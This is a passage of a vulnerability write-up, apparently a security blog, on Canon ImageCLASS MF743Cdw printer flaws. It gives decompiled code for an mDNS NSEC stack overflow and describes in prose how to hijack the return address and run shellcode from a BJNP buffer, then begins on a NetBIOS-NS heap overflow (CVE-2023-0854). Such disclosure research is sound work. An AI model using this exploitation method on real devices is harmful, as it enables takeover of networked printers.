      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When it is parsing the NSEC(type 47) record, it does not check the length of the record. It will copy the data to a local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, which leads to a stack buffer overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct an mDNS packet to trigger the stack overflow. It does not have Stack Guard, so we can overwrite the return address directly. It also does not implement DEP. We can overwrite the return address with a global buffer which we can control to run our shellcode.&lt;/p&gt;

&lt;p&gt;We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can run shellcode to do anything, such as modifying the website, changing the LCD screen, etc.&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;
&lt;p&gt;ï¼·e found a heap overflow on NetBIOS. NetBIOS is a protocol for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. . Canon implemented the NetBIOS daemon by themselves.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;NetBIOS provides three distinct services:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) for name registration and resolution.&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) for connectionless communication.&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) for connection-oriented communication.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will focus on NetBIOS-NS (port 137).&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about NetBIOS-NS Packet Structure.&lt;/p&gt;

&lt;p&gt;NetBIOS-NS is based on the DNS packet format. It is defined in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; for both queries and responses. NetBIOS queries and responses utilize the NS header format defined in RFC1002 with exceptions noted below:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The query will be placed after the header. The first element is QNAME which is a domain name represented as a sequence of labels, where each label consists of a length character followed by that number of characters. Other element is not important in this vulnerability, so we wonâ€™t explain more here. More details can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the NetBIOS in NetBIOS packets, there is a heap overflow. The vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function. We can trigger it from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When NetBIOS service starts, it will initial &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt;. The buffer would be allocated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xff&lt;/code&gt; bytes from the heap.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When parsing the NetBIOS-NS in NetBIOS packets, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt; to process it.&lt;/p&gt;

